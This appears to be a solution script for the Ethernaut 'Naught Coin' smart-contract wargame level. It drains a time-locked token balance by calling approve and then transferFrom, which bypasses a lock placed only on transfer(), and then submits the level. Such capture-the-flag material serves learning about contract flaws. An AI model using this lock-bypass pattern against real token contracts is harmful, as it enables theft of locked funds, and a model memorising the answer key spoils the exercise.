module.exports = async function({ artifacts, ethernaut }) {
  const NaughtCoinInterface = artifacts.require('NaughtCoin');
  const instanceAddress = await ethernaut.createInstance('Naught Coin');
  const coinInstance = await NaughtCoinInterface.at(instanceAddress);

  const sender = await ethernaut.getSenderAddress();
  const balance = await coinInstance.balanceOf(sender);

  await coinInstance.approve(sender, balance);
  await coinInstance.transferFrom(sender, ethernaut.address, balance);

  return ethernaut.submitInstance(instanceAddress);
};